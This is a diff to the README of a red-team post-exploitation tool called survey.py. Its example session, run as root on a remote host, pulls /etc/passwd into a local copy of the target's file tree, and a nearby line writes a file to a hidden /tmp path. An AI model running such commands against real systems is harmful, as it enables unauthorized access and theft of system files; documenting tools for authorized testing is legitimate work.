@@ -1,8 +1,8 @@
 # Survey
 # Installation 
 ````
-git clone https://github.com/ice-wzl/survey.git
-cd survey/
+git clone https://github.com/ice-wzl/red-team-tools.git
+cd red-team-tools/
 pip install requirements.txt
 ````
 # survey.py
@@ -72,11 +72,19 @@ remote path for file: /tmp/.hidden.txt
 ````
 ## How to download 
 ````
-root@10.0.0.5---> download
+root@10.0.0.5:# download                                                                                                          
 remote file to grab: /etc/passwd
+Downloading: [100.0%] [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]  
 Download Success /etc/passwd
 ````
 - Verify that your download worked 
+- Download will rebuilt the target file system on your local machine 
+````
+[rocky@rocky red-team-tools]$ tree
+.
+├── 10.0.0.5
+│   └── etc
+│       └── passwd
 ````
 root@10.0.0.5---> lls .
 total 40
